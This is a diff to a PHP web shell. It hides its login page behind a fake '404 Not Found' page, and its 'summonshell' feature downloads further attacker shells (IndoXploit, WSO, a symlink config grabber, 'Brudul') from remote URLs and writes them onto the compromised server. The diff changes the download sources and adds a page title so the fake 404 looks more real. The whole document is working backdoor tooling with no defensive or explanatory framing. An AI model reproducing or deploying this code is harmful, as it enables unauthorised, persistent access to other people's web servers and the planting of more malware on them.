@@ -25,6 +25,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 
 function login_shell() {
 ?>
+<title>404 Not Found</title>
 <h1>Not Found</h1> 
 <p>The requested URL was not found on this server.</p> 
 <hr> 
@@ -441,41 +442,42 @@ elseif ($_GET['crot'] == 'ngesym') {
 }
 elseif($_GET['crot'] == 'summonshell'){
 	echo '<center>';
-	$summonidx = file_get_contents('http://kjm.univpancasila.ac.id/upload/file/ewe.txt');
-	$summonwso = file_get_contents('http://kjm.univpancasila.ac.id/upload/file/wso.txt');
-	$summonconkill = file_get_contents('http://kjm.univpancasila.ac.id/upload/file/confkiller.txt');
-	$summonb374k = file_get_contents('http://kjm.univpancasila.ac.id/upload/file/b374k.txt');
+	$summonidx = file_get_contents('https://raw.githubusercontent.com/florienzh4x/webshell/master/indoxploit.php');
+	$summonwso = file_get_contents('https://raw.githubusercontent.com/florienzh4x/webshell/master/wso.php');
+	$summonconkill = file_get_contents('https://raw.githubusercontent.com/florienzh4x/webshell/master/symcon.php');
+	$summonbrudul = file_get_contents('https://raw.githubusercontent.com/florienzh4x/webshell/master/brudul.php');
 	echo 'Summon Shell<br />';
 	echo '<form method=post>
 		  <select name=shell>
 		  <option value=1>Idx Shell</option>
 		  <option value=2>WSO</option>
-		  <option value=3>Config Killer IndiShell</option>
-  		  <option value=4>b374k Mini</option>
-		  </select> <input type="submit" value="exec"><br />';
+		  <option value=3>Symlink Config</option>
+  		  <option value=4>Brudul Shell</option>
+		  </select> 
+		  <input type="submit" value="exec"><br />';
 	if($_POST['shell'] == '1'){
 		$new = fopen('idx.php', w);
 		fwrite($new, $summonidx);
 		fclose($new);
-		echo'done idx';
+		echo'done IndoXploit';
 	}
 	elseif($_POST['shell'] == '2'){
 		$new = fopen('wso.php', w);
 		fwrite($new, $summonwso);
 		fclose($new);
-		echo'done wso';
+		echo'done WSO';
 	}
 	elseif($_POST['shell'] == '3'){
-		$new = fopen('conkill.php', w);
+		$new = fopen('symcon.php', w);
 		fwrite($new, $summonconkill);
 		fclose($new);
-		echo'done config killer indishell';
+		echo'done Symlink Config';
 	}
 	elseif($_POST['shell'] == '4'){
-		$new = fopen('b374k.php', w);
-		fwrite($new, $summonb374k);
+		$new = fopen('heker.php', w);
+		fwrite($new, $summonbrudul);
 		fclose($new);
-		echo'done b374k';
+		echo'done Brudul';
 	}
 	else{
 		echo '~ ...';
